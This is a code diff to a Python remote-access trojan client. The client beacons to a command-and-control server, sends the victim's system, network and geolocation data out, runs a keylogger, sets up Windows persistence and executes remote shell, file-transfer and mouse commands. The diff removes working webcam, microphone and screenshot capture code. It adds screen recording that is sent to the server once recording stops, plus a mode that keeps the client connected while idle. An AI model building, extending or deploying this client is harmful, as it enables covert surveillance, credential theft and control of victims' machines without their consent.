@@ -17,11 +17,6 @@ from pynput.keyboard import Listener as KeyboardListener, Key, Controller as Key
 from pynput.mouse import Controller as MouseController, Listener as MouseListener, Button
 import base64
 import requests
-import platform
-if platform.system() == "Windows":
-    import winreg
-else:
-    print("Windows persistence not supported in this environment. Please run on a Windows machine.")
 import getpass
 import socket
 import sys
@@ -30,8 +25,17 @@ import uuid
 import datetime
 import pytz
 
+if platform.system() == "Windows":
+    import winreg
+else:
+    print("[!] This client persistence is not compatible with non-Windows systems.")
+
 # Server settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"
+
+# Toggle flags for monitoring
+MONITOR_NETWORK = True
+MONITOR_SYSTEM = True
 
 def get_system_info():
     """Gather detailed system information."""
@@ -127,7 +131,6 @@ def get_network_info():
                 mac_addresses[iface] = mac
         network_info[iface] = iface_info
 
-    # Get public IP and location
     try:
         public_ip = requests.get("https://api.ipify.org").text
         location_data = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
@@ -145,7 +148,6 @@ def get_network_info():
         print(f"[!] Error getting public IP/location: {e}")
         location = {"public_ip": "Unknown", "city": "Unknown", "country": "Unknown"}
 
-    # Get gateway and DNS
     try:
         gateway = netifaces.gateways()['default'][netifaces.AF_INET][0] if netifaces.gateways()['default'].get(netifaces.AF_INET) else "Unknown"
     except Exception as e:
@@ -383,6 +385,8 @@ def can_run_sudo():
 
 def monitor_network(sio):
     """Monitor network traffic and speed."""
+    if not MONITOR_NETWORK:
+        return
     last_bytes_sent = psutil.net_io_counters().bytes_sent
     last_bytes_recv = psutil.net_io_counters().bytes_recv
     last_time = time.time()
@@ -418,6 +422,8 @@ def monitor_network(sio):
 
 def monitor_system(sio):
     """Monitor CPU and memory usage."""
+    if not MONITOR_SYSTEM:
+        return
     while True:
         time.sleep(5)
         try:
@@ -437,127 +443,43 @@ def monitor_system(sio):
             print(f"[!] Error monitoring system: {e}")
 
 def capture_webcam(sio):
-    """Capture a single frame from the webcam."""
-    try:
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            print("[!] Webcam not accessible")
-            sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam not accessible"}))
-            return
-        ret, frame = cap.read()
-        cap.release()
-        if ret:
-            _, img_encoded = cv2.imencode('.jpg', frame)
-            img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
-            sio.emit('exfil_data', json.dumps({
-                "type": "webcam_data",
-                "client_id": sio.sid,
-                "image": img_base64
-            }))
-            print("[*] Sent webcam data")
-        else:
-            print("[!] Failed to capture webcam frame")
-    except Exception as e:
-        print(f"[!] Error capturing webcam: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": str(e)}))
+    """Capture a single frame from the webcam (disabled)."""
+    print("[!] Webcam capture disabled")
+    sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam capture disabled"}))
 
 def record_mic(sio, duration=5):
-    """Record audio from mic for a specified duration."""
-    try:
-        p = pyaudio.PyAudio()
-        device_count = p.get_device_count()
-        mic_available = False
-        for i in range(device_count):
-            device_info = p.get_device_info_by_index(i)
-            if device_info['maxInputChannels'] > 0:
-                mic_available = True
-                break
-        if not mic_available:
-            print("[!] No microphone detected")
-            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "No microphone detected"}))
-            p.terminate()
-            return
-
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 1
-        RATE = 44100
-
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        frames = []
-
-        print("[*] Recording mic...")
-        for _ in range(0, int(RATE / CHUNK * duration)):
-            data = stream.read(CHUNK, exception_on_overflow=False)
-            frames.append(data)
-
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-
-        timestamp = time.time()
-        mic_file = f"mic_{timestamp}.wav"
-        wf = wave.open(mic_file, 'wb')
-        wf.setnchannels(CHANNELS)
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(RATE)
-        wf.writeframes(b''.join(frames))
-        wf.close()
-
-        if os.path.exists(mic_file):
-            with open(mic_file, "rb") as audio_file:
-                audio_base64 = base64.b64encode(audio_file.read()).decode('utf-8')
-                sio.emit('exfil_data', json.dumps({
-                    "type": "mic_data",
-                    "client_id": sio.sid,
-                    "audio": audio_base64
-                }))
-                print("[*] Sent mic data")
-            os.remove(mic_file)
-        else:
-            print(f"[!] Mic file {mic_file} not found after writing")
-            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": f"Mic file {mic_file} not found"}))
-    except Exception as e:
-        print(f"[!] Error recording mic: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": str(e)}))
+    """Record audio from mic for a specified duration (disabled)."""
+    print("[!] Mic recording disabled")
+    sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "Mic recording disabled"}))
 
 def take_screenshot(sio):
-    """Capture a screenshot."""
-    try:
-        screenshot = ImageGrab.grab()
-        screenshot.save("screenshot.png")
-        with open("screenshot.png", "rb") as img_file:
-            img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
-            sio.emit('exfil_data', json.dumps({
-                "type": "screenshot_data",
-                "client_id": sio.sid,
-                "image": img_base64
-            }))
-            print("[*] Sent screenshot")
-        os.remove("screenshot.png")
-    except Exception as e:
-        print(f"[!] Error taking screenshot: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": str(e)}))
+    """Capture a screenshot (disabled)."""
+    print("[!] Screenshot capture disabled")
+    sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": "Screenshot capture disabled"}))
 
-def stream_screen(sio, stop_event):
-    """Stream the victim's screen at 5 FPS."""
+def record_screen(sio, stop_event):
+    """Record the screen and send to server when stopped."""
     try:
+        frames = []
         while not stop_event.is_set():
             screenshot = ImageGrab.grab()
-            screenshot = screenshot.resize((1280, 720))  # Resize for performance
-            screenshot.save("screen_stream.jpg", quality=50)  # Lower quality for speed
-            with open("screen_stream.jpg", "rb") as img_file:
-                img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
-                sio.emit('exfil_data', json.dumps({
-                    "type": "screen_stream",
-                    "client_id": sio.sid,
-                    "image": img_base64
-                }))
-            os.remove("screen_stream.jpg")
+            screenshot.save("temp_screen.jpg", quality=50)
+            with open("temp_screen.jpg", "rb") as img_file:
+                frames.append(base64.b64encode(img_file.read()).decode('utf-8'))
+            os.remove("temp_screen.jpg")
             time.sleep(0.2)  # 5 FPS
+
+        if frames:
+            screen_data = {
+                "type": "screen_record",
+                "client_id": sio.sid,
+                "frames": frames
+            }
+            sio.emit('exfil_data', json.dumps(screen_data))
+            print("[*] Sent screen recording")
     except Exception as e:
-        print(f"[!] Error streaming screen: {e}")
-        sio.emit('exfil_data', json.dumps({"type": "screen_stream_error", "message": str(e)}))
+        print(f"[!] Error recording screen: {e}")
+        sio.emit('exfil_data', json.dumps({"type": "screen_record_error", "message": str(e)}))
 
 def on_mouse_move(x, y):
     print(f"[*] Mouse moved to ({x}, {y})")
@@ -669,18 +591,20 @@ def execute_command(command, sio):
                 return result.stdout + result.stderr
         elif command.strip().lower() == "help":
             commands = [
-                "webcam - Capture webcam image",
-                "mic - Record audio from microphone",
-                "screenshot - Take a screenshot",
+                "webcam - Capture webcam image (disabled)",
+                "mic - Record audio from microphone (disabled)",
+                "screenshot - Take a screenshot (disabled)",
                 "move x y - Move mouse to (x, y)",
                 "click button - Click mouse (button: left, right)",
                 "download <path> - Download a file from client",
                 "upload <file> - Upload a file to client (via web interface)",
                 "clear_keylogs - Clear keylogs",
                 "setup_persistence - Set up client to run on boot",
-                "start_stream - Start screen streaming",
-                "stop_stream - Stop screen streaming",
-                "exit - Disconnect client"
+                "start_record - Start screen recording",
+                "stop_record - Stop screen recording",
+                "toggle_network - Toggle network monitoring",
+                "toggle_cpu - Toggle CPU monitoring",
+                "exit - Set client to idle"
             ]
             return "\n".join(commands)
         else:
@@ -828,7 +752,7 @@ def handle_file_upload(filename, data, sio):
 
 def main():
     sio = Client()
-    screen_stream_stop_event = threading.Event()
+    screen_record_stop_event = threading.Event()
     try:
         @sio.event
         def connect():
@@ -856,14 +780,16 @@ def main():
             sio.emit('exfil_data', json.dumps(exfil_data))
             print("[*] Exfiltrated data sent to RAT server")
 
-            sio.start_background_task(monitor_network, sio)
-            sio.start_background_task(monitor_system, sio)
+            if MONITOR_NETWORK:
+                sio.start_background_task(monitor_network, sio)
+            if MONITOR_SYSTEM:
+                sio.start_background_task(monitor_system, sio)
             sio.start_background_task(start_keylogger, sio)
 
         @sio.event
         def disconnect():
-            print(f"[*] Disconnected from RAT server with SID: {sio.sid}")
-            screen_stream_stop_event.set()
+            print(f"[*] Client set to idle with SID: {sio.sid}")
+            sio.emit('exfil_data', json.dumps({"type": "client_status", "status": "idle", "client_id": sio.sid}))
 
         @sio.event
         def connect_error(data):
@@ -874,8 +800,8 @@ def main():
             print(f"[*] Received command: {data}")
             if data.strip().lower() == "exit":
                 print("[*] Received exit command")
-                screen_stream_stop_event.set()
-                sio.disconnect()
+                screen_record_stop_event.set()
+                sio.emit('exfil_data', json.dumps({"type": "client_status", "status": "idle", "client_id": sio.sid}))
                 return
             elif data.strip().lower() == "webcam":
                 capture_webcam(sio)
@@ -887,21 +813,39 @@ def main():
                 clear_keylogs(sio)
             elif data.strip().lower() == "setup_persistence":
                 setup_persistence(sio)
-            elif data.strip().lower() == "start_stream":
-                screen_stream_stop_event.clear()
-                sio.start_background_task(stream_screen, sio, screen_stream_stop_event)
+            elif data.strip().lower() == "start_record":
+                screen_record_stop_event.clear()
+                sio.start_background_task(record_screen, sio, screen_record_stop_event)
                 sio.emit('exfil_data', json.dumps({
                     "type": "command_output",
-                    "command": "start_stream",
-                    "output": "Screen streaming started",
+                    "command": "start_record",
+                    "output": "Screen recording started",
                     "current_dir": os.getcwd()
                 }))
-            elif data.strip().lower() == "stop_stream":
-                screen_stream_stop_event.set()
+            elif data.strip().lower() == "stop_record":
+                screen_record_stop_event.set()
                 sio.emit('exfil_data', json.dumps({
                     "type": "command_output",
-                    "command": "stop_stream",
-                    "output": "Screen streaming stopped",
+                    "command": "stop_record",
+                    "output": "Screen recording stopped",
+                    "current_dir": os.getcwd()
+                }))
+            elif data.strip().lower() == "toggle_network":
+                global MONITOR_NETWORK
+                MONITOR_NETWORK = not MONITOR_NETWORK
+                sio.emit('exfil_data', json.dumps({
+                    "type": "command_output",
+                    "command": "toggle_network",
+                    "output": f"Network monitoring {'enabled' if MONITOR_NETWORK else 'disabled'}",
+                    "current_dir": os.getcwd()
+                }))
+            elif data.strip().lower() == "toggle_cpu":
+                global MONITOR_SYSTEM
+                MONITOR_SYSTEM = not MONITOR_SYSTEM
+                sio.emit('exfil_data', json.dumps({
+                    "type": "command_output",
+                    "command": "toggle_cpu",
+                    "output": f"CPU monitoring {'enabled' if MONITOR_SYSTEM else 'disabled'}",
                     "current_dir": os.getcwd()
                 }))
             elif data.strip().lower().startswith("move ") or data.strip().lower().startswith("click "):
@@ -931,16 +875,16 @@ def main():
                 print(f"[*] Attempting to connect to {SERVER_URL}")
                 sio.connect(SERVER_URL, transports=['websocket'], wait_timeout=10)
                 sio.wait()
-                break
             except Exception as e:
                 print(f"[!] Connection failed: {str(e)}")
                 print("[*] Retrying in 5 seconds...")
                 time.sleep(5)
     except KeyboardInterrupt:
         print("[*] Shutting down client...")
-        screen_stream_stop_event.set()
+        screen_record_stop_event.set()
     finally:
         if sio.connected:
+            sio.emit('exfil_data', json.dumps({"type": "client_status", "status": "idle", "client_id": sio.sid}))
             sio.disconnect()
 
 if __name__ == "__main__":
